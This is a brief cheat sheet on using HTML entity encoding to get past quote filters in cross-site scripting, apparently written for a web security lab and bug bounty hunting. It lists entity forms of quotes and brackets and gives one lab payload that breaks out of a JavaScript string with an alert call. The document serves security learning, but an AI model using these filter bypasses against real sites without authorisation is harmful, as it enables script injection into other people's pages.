# HTML Encoding Bypass CheatSheet

## Why It Works

Browser Processing:

```text
HTML Entity
        ↓
HTML Decoding
        ↓
JavaScript Parsing
```

---

# Single Quote

```html
&apos;
```

becomes:

```javascript
'
```

---

# Double Quote

```html
&quot;
```

becomes:

```javascript
"
```

---

# Less Than

```html
&lt;
```

becomes:

```html
<
```

---

# Greater Than

```html
&gt;
```

becomes:

```html
>
```

---

# Lab Payload

```html
&apos;-alert(1)-&apos;
```

---

# Related Lab

```text
Lab22
```

---

# Bug Bounty Reminder

When quotes are blocked:

```text
Try HTML Entities
```

before giving up.